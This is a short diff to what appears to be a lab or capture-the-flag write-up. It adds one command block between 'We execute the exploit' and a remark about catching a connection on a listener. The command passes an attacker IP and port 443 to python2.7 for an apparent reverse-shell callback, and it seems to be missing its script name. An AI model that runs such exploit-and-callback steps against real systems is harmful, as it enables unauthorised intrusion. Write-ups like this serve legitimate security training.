@@ -404,6 +404,12 @@ We execute the exploit:
 
 <br />
 
+```bash
+❯ python2.7 10.10.14.11 443
+```
+
+<br />
+
 Check the listener and... YES!!
 
 <br />
